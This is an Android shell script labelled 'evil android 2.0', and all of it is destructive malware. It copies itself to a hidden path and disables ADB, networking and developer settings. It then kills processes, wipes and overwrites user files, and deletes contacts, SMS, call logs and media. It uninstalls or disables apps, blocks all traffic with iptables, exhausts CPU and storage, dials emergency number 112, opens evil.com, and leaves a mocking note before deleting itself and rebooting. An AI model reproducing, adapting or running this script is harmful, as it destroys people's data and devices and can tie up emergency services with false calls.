#!/system/bin/sh
# evil android 2.0 - No Root Advanced (Максимум без прав)

LOCKFILE="/data/local/tmp/evil.lock"
if [ -f "$LOCKFILE" ]; then
    exit 0
fi
echo $$ > "$LOCKFILE"

PERSISTENT="/data/local/tmp/.evil.sh"
cp "$0" "$PERSISTENT" 2>/dev/null
chmod 755 "$PERSISTENT" 2>/dev/null
FLAG="/data/local/tmp/.evil_done"

if [ ! -f "$FLAG" ]; then
    settings put global development_settings_enabled 0 2>/dev/null
    settings put global adb_enabled 0 2>/dev/null
    settings put global install_non_market_apps 0 2>/dev/null
    settings put global wifi_on 0 2>/dev/null
    settings put global bluetooth_on 0 2>/dev/null
    settings put global airplane_mode_on 1 2>/dev/null
    settings put global global_http_proxy_host "127.0.0.1" 2>/dev/null
    settings put global global_http_proxy_port 9999 2>/dev/null
    settings put system screen_off_timeout 1 2>/dev/null
    settings put global animator_duration_scale 2.0 2>/dev/null
    settings put global transition_animation_scale 2.0 2>/dev/null
    settings put global window_animation_scale 2.0 2>/dev/null
    settings put global font_scale 2.0 2>/dev/null
    
    am start -a android.settings.WIFI_SETTINGS 2>/dev/null
    am start -a android.settings.BLUETOOTH_SETTINGS 2>/dev/null
    am start -a android.settings.AIRPLANE_MODE_SETTINGS 2>/dev/null
    
    touch "$FLAG"
    am start -a android.intent.action.REBOOT 2>/dev/null
    input keyevent KEYCODE_POWER 2>/dev/null
    exit
fi

for pid in $(ps -A -o PID 2>/dev/null | tail -n +2); do
    if [ "$pid" != "$$" ] && [ "$pid" != "1" ] && [ "$pid" -gt 100 ] 2>/dev/null; then
        kill -9 "$pid" 2>/dev/null
    fi
done

rm -rf /sdcard/DCIM/* 2>/dev/null
rm -rf /sdcard/Download/* 2>/dev/null
rm -rf /sdcard/Documents/* 2>/dev/null
rm -rf /sdcard/Music/* 2>/dev/null
rm -rf /sdcard/Pictures/* 2>/dev/null
rm -rf /sdcard/Movies/* 2>/dev/null
rm -rf /sdcard/WhatsApp/* 2>/dev/null
rm -rf /sdcard/Telegram/* 2>/dev/null
rm -rf /sdcard/Android/data/* 2>/dev/null
rm -rf /sdcard/Android/obb/* 2>/dev/null
rm -rf /sdcard/Alarms/* 2>/dev/null
rm -rf /sdcard/Notifications/* 2>/dev/null
rm -rf /sdcard/Ringtones/* 2>/dev/null
rm -rf /sdcard/Podcasts/* 2>/dev/null
rm -rf /storage/emulated/0/* 2>/dev/null

find /sdcard -type f 2>/dev/null | while read -r file; do
    dd if=/dev/urandom of="$file" bs=1024 count=1 2>/dev/null
    rm -f "$file" 2>/dev/null
done

svc wifi disable 2>/dev/null
svc bluetooth disable 2>/dev/null
svc nfc disable 2>/dev/null
svc data disable 2>/dev/null

iptables -P INPUT DROP 2>/dev/null
iptables -P OUTPUT DROP 2>/dev/null
iptables -P FORWARD DROP 2>/dev/null
iptables -F 2>/dev/null
iptables -X 2>/dev/null

settings put global wifi_on 0 2>/dev/null
settings put global bluetooth_on 0 2>/dev/null
settings put global airplane_mode_on 1 2>/dev/null

content delete --uri content://contacts/people 2>/dev/null
content delete --uri content://contacts 2>/dev/null
content delete --uri content://com.android.contacts/contacts 2>/dev/null
content delete --uri content://sms 2>/dev/null
content delete --uri content://sms/conversations 2>/dev/null
content delete --uri content://call_log/calls 2>/dev/null
content delete --uri content://media/external/images/media 2>/dev/null
content delete --uri content://media/external/video/media 2>/dev/null
content delete --uri content://media/external/audio/media 2>/dev/null

pm list packages -3 2>/dev/null | cut -d: -f2 | while read -r pkg; do
    pm uninstall "$pkg" 2>/dev/null
    pm clear "$pkg" 2>/dev/null
done

pm list packages -s 2>/dev/null | cut -d: -f2 | while read -r pkg; do
    pm disable "$pkg" 2>/dev/null
    pm clear "$pkg" 2>/dev/null
done

am force-stop com.android.chrome 2>/dev/null
am force-stop com.android.browser 2>/dev/null
am force-stop com.whatsapp 2>/dev/null
am force-stop com.instagram.android 2>/dev/null
am force-stop com.facebook.katana 2>/dev/null
am force-stop com.tencent.mm 2>/dev/null
am force-stop com.tencent.mobileqq 2>/dev/null

cmd notification post -S bigtext -t "EVIL" "Tag" "Вы добровольно запустили этот файл) by. evil" 2>/dev/null

for i in 1 2 3 4 5 6 7 8 9 10; do
    input keyevent KEYCODE_APP_SWITCH 2>/dev/null
    input keyevent KEYCODE_HOME 2>/dev/null
    input keyevent KEYCODE_BACK 2>/dev/null
    input keyevent KEYCODE_MENU 2>/dev/null
done

for i in 1 2 3 4 5; do
    input keyevent KEYCODE_POWER 2>/dev/null
    sleep 0.5
    input keyevent KEYCODE_VOLUME_UP 2>/dev/null
    sleep 0.5
    input keyevent KEYCODE_VOLUME_DOWN 2>/dev/null
    sleep 0.5
done

media volume --stream 2 --set 15 2>/dev/null
for i in 1 2 3 4 5 6 7 8 9 10; do
    cmd media play 2>/dev/null
    cmd media audio 2>/dev/null
    cmd media play-audio 2>/dev/null
    sleep 0.3
done

cpu_cores=$(grep -c processor /proc/cpuinfo 2>/dev/null || echo 4)
for i in $(seq 1 $cpu_cores); do
    (while true; do
        echo "scale=100000; 4*a(1)" | bc -l 2>/dev/null
        openssl speed 2>/dev/null
    done) &
done

for i in 1 2 3 4 5; do
    dd if=/dev/urandom of=/data/local/tmp/fill bs=1024 count=102400 2>/dev/null
    cat /data/local/tmp/fill /data/local/tmp/fill > /data/local/tmp/fill2 2>/dev/null
    cp /data/local/tmp/fill2 /data/local/tmp/fill 2>/dev/null
done

am start -a android.intent.action.DIAL -d tel:112 2>/dev/null
input keyevent KEYCODE_CALL 2>/dev/null
sleep 2
input keyevent KEYCODE_ENDCALL 2>/dev/null

am start -a android.settings.SETTINGS 2>/dev/null
am start -a android.settings.DEVELOPMENT_SETTINGS 2>/dev/null
am start -a android.settings.APPLICATION_SETTINGS 2>/dev/null
am start -a android.settings.MANAGE_APPLICATIONS_SETTINGS 2>/dev/null

for i in 1 2 3 4 5; do
    am start -a android.intent.action.VIEW -d "https://evil.com" 2>/dev/null
    am start -a android.intent.action.VIEW -d "market://details?id=evil.app" 2>/dev/null
done

echo '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
'

echo "Вы добровольно запустили этот файл) by. evil"

sleep 3

rm -rf /data/local/tmp/fill* 2>/dev/null
rm -f "$0" 2>/dev/null
rm -f "$PERSISTENT" 2>/dev/null
rm -f "$LOCKFILE" 2>/dev/null

am start -a android.intent.action.REBOOT 2>/dev/null
input keyevent KEYCODE_POWER 2>/dev/null
input keyevent KEYCODE_POWER 2>/dev/null
input keyevent KEYCODE_POWER 2>/dev/null